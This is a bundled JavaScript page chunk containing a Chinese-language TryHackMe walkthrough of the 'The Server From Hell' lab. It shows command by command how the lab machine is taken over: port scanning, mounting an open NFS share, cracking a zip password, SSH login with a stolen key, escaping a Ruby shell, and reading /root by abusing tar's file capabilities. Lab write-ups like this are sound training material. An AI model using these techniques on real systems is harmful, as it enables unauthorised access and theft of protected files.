"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8902],{9283:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>h});var t=r(74848),s=r(28453);const o={sidebar_position:114,tags:["Easy","Linux","Capabilities","services"],title:"The Server From Hell",description:"The Server From Hell",sidebar_label:"The Server From Hell",slug:"/tryhackme/114"},a="The Server From Hell",i={id:"box/TryHackMe/114",title:"The Server From Hell",description:"The Server From Hell",source:"@site/docs/box/TryHackMe/114.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/114",permalink:"/docs/tryhackme/114",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"Capabilities",permalink:"/docs/tags/capabilities"},{label:"services",permalink:"/docs/tags/services"}],version:"current",sidebarPosition:114,frontMatter:{sidebar_position:114,tags:["Easy","Linux","Capabilities","services"],title:"The Server From Hell",description:"The Server From Hell",sidebar_label:"The Server From Hell",slug:"/tryhackme/114"},sidebar:"boxSidebar",previous:{title:"Olympus",permalink:"/docs/tryhackme/113"},next:{title:"biteme",permalink:"/docs/tryhackme/115"}},l={},h=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"NFS",id:"nfs",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"hades(irb)",id:"hadesirb",level:3},{value:"hades(irb) \u2014&gt; hades (host)",id:"hadesirb--hades-host",level:3},{value:"hades \u2014&gt; root",id:"hades--root",level:3}];function c(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"the-server-from-hell",children:"The Server From Hell"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~# nmap -sT -p 1377-65535 --min-rate 1000 10.10.217.149\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u9898\u76ee\u544a\u8bc9\u6211\u4eec\u5efa\u8bae\u4ece 1337 \u7aef\u53e3\u5f00\u59cb, \u5728\u6211\u4eec\u626b\u63cf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230\u6709\u5f88\u591a\u8f93\u51fa"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u5f53\u6211\u8fde\u63a5 1337 \u7aef\u53e3\u65f6\u7ed9\u51fa\u4e86\u4e00\u6bb5\u63d0\u793a, \u544a\u8bc9\u6211\u4eec\u8981\u5173\u6ce8\u524d 100 \u4e2a \u7aef\u53e3, \u63a5\u7740\u6211\u7ee7\u7eed\u8fdb\u884c\u4e86\u5229\u7528"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~# nc 10.10.217.149 1337\nWelcome traveller, to the beginning of your journey\nTo begin, find the trollface\nLegend says he's hiding in the first 100 ports\nTry printing the banners from the ports\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u8fd9\u6b21\u679a\u4e3e\u4e2d\u4e00\u76f4\u5728\u63d0\u793a\u6211 12345 , \u8fd9\u53ef\u80fd\u662f\u4e2a\u7aef\u53e3\u53f7\u6211\u63a5\u7740\u8fdb\u884c\u4e86\u8fde\u63a5\u6d4b\u8bd5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell# nmap -sTCV -p 1-100 --min-rate 1000 10.10.217.149\nPORT    STATE SERVICE            VERSION\n1/tcp   open  tcpmux?\n| fingerprint-strings: \n|   NULL: \n|_    550 12345 0000000000000000000000000000000000000000000000000000000\n......\n\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u8fd9\u6b21\u8fde\u63a5\u4e2d, \u5176\u544a\u8bc9\u6211\u4eec\u5b58\u5728 NFS \u5171\u4eab\u5728\u9ed8\u8ba4\u4f4d\u7f6e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell# nc 10.10.217.149 12345\nNFS shares are cool, especially when they are misconfigured\nIt's on the standard port, no need for another scan\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nfs",children:"NFS"}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u4e4b\u524d\u7684\u6d88\u606f,\u73b0\u5728\u6211\u4eec\u5c06\u5c1d\u8bd5\u5229\u7528 NFS \u670d\u52a1\u8fdb\u884c\u64cd\u4f5c, \u4ece\u4e0b\u9762\u7684\u4fe1\u606f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b58\u5728\u4e00\u4e2a\u5171\u4eab\u5e76\u4e14\u5176\u4e2d\u5b58\u5728\u4e00\u4e2a\u5171\u4eab\u7684\u538b\u7f29\u6587\u4ef6,"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell# showmount -e 10.10.217.149\nExport list for 10.10.217.149:\n/home/nfs *\nroot@ip-10-10-4-132:~/theserverfromhell# mkdir nfs\nroot@ip-10-10-4-132:~/theserverfromhell#  mount -t nfs  10.10.217.149:/home/nfs ./nfs/  -o nolock\nroot@ip-10-10-4-132:~/theserverfromhell# cd nfs/\nroot@ip-10-10-4-132:~/theserverfromhell/nfs# ls\nbackup.zip\nroot@ip-10-10-4-132:~/theserverfromhell/nfs# ls -al\ntotal 16\ndrwxr-xr-x 2 nobody nogroup 4096 Sep 15  2020 .\ndrwxr-xr-x 3 root   root    4096 Sep 25 03:27 ..\n-rw-r--r-- 1 root   root    4534 Sep 15  2020 backup.zip\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06\u4e0a\u9762\u53d1\u73b0\u7684\u538b\u7f29\u6587\u4ef6\u590d\u5236\u5230\u672c\u5730\u5e76\u4e14\u8fdb\u884c\u89e3\u538b\u7f29 (\u5b58\u5728\u52a0\u5bc6\u5e76\u8fdb\u884c\u89e3\u5bc6)"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell# john hash.txt --wordlist=`locate rockyou.txt`\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nzxcvbnm          (backup.zip)\n1g 0:00:00:00 DONE (2023-09-25 03:31) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\nroot@ip-10-10-4-132:~/theserverfromhell# unzip backup.zip \nArchive:  backup.zip\n   creating: home/hades/.ssh/\n[backup.zip] home/hades/.ssh/id_rsa password: \n  inflating: home/hades/.ssh/id_rsa  \n extracting: home/hades/.ssh/hint.txt  \n  inflating: home/hades/.ssh/authorized_keys  \n extracting: home/hades/.ssh/flag.txt  \n  inflating: home/hades/.ssh/id_rsa.pub\nroot@ip-10-10-4-132:~/theserverfromhell/home/hades/.ssh# cat hint.txt \n2500-4500\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u7684\u4fe1\u606f\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u662f\u6709\u4e86 SSH \u7684\u5bc6\u94a5, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c SSH \u7684\u4f1a\u8bdd\u767b\u9646, \u5e76\u4e14\u5176\u53c8\u544a\u8bc9\u6211\u4eec\u4e00\u4e2a\u7aef\u53e3\u8303\u56f4\u6211\u4eec\u9700\u8981\u5728\u6b64\u679a\u4e3e\u4ee5\u6b64\u5b9a\u4f4d SSH \u7aef\u53e3"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell# nmap -sTCV -p 2500-4500 --min-rate 1000 10.10.217.149\n.....\n3328/tcp open  telnet\n| fingerprint-strings: \n|   NULL: \n|     PRICOM 3100 Ver ee TELNET server.\n|     Copyright (C) 2002-2004 silex technology, Inc.\n|_    login:\n3329/tcp open  telnet              BusyBox telnetd\n3330/tcp open  smtp-proxy          1st SMTP relay\n3331/tcp open  http                GoAhead WebServer\n|_http-server-header: GoAhead-Webs\n|_http-title: Document Error: Page not found\n3332/tcp open  mcs-mailsvr?\n| fingerprint-strings: \n|   NULL: \n|_    JTAG Server\n3333/tcp open  ssh                 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 37:4d:be:c4:8f:c2:20:43:bb:01:f2:10:fc:bd:ff:93 (RSA)\n|   256 2d:23:13:84:ff:cb:00:b4:71:2a:5e:56:72:d6:90:e5 (ECDSA)\n|_  256 22:34:b2:2f:4a:17:87:0e:75:5b:d3:a1:a4:8a:f5:d8 (EdDSA)\n3334/tcp open  http                Ambit DOCSIS router http config (R4)\n|_http-generator: Multi-Functional Broadband NAT Router (R4)\n|_http-server-header: Embeded_httpd\n|_http-title: Site doesn't have a title (text/html).\n3335/tcp open  smtp                Hamster smtpd (Access denied)\n|_smtp-commands: SMTP EHLO ip-10-10-217-149.eu-west-1.compute.internal: failed to receive data: connection closed\n3336/tcp open  directv-tick?\n3337/tcp open  http                Siemens Gigaset . .&.D. WAP http confi\n.....\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"hadesirb",children:"hades(irb)"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u6211\u4eec\u53d1\u73b0\u7684\u5bc6\u94a5\u4ee5\u53ca\u7528\u6237\u8fdb\u884c\u767b\u9646, \u53d1\u73b0\u5176\u662f\u4e00\u4e2a ruby \u7684\u4ea4\u4e92\u5f0f\u5ba2\u6237\u7aef, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u9003\u9038"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-4-132:~/theserverfromhell/home/hades/.ssh# ssh -i id_rsa hades@10.10.217.149 -p 3333\nirb(main):006:0> system('whoami')\nhades\n=> true\n"})}),"\n",(0,t.jsx)(n.h3,{id:"hadesirb--hades-host",children:"hades(irb) \u2014> hades (host)"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u4e0a\u9762\u7684 system \u8fdb\u884c\u6267\u884c\u547d\u4ee4\u6765\u83b7\u53d6 Shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-133836.png",alt:"Untitled"})}),"\n",(0,t.jsx)(n.h3,{id:"hades--root",children:"hades \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0 tar \u547d\u4ee4\u5b58\u5728 capabilities \u7279\u6743\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6253\u5305 root \u76ee\u5f55\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) hades@hell:/home$ getcap -r / 2>/dev/null \n/usr/bin/mtr-packet = cap_net_raw+ep\n/bin/tar = cap_dac_read_search+ep\n(remote) hades@hell:/tmp$ /bin/tar -czvf root.tar.gz /root\n/bin/tar: Removing leading `/' from member names\n/root/\n/root/.gnupg/\n/root/.gnupg/private-keys-v1.d/\n/root/.bashrc\n/root/root.txt\n/root/.bash_history\n/root/.ssh/\n/root/.ssh/authorized_keys\n/root/.cache/\n/root/.cache/motd.legal-displayed\n/root/.profile\n"})})]})}function d(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>i});var t=r(96540);const s={},o=t.createContext(s);function a(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),t.createElement(o.Provider,{value:n},e.children)}}}]);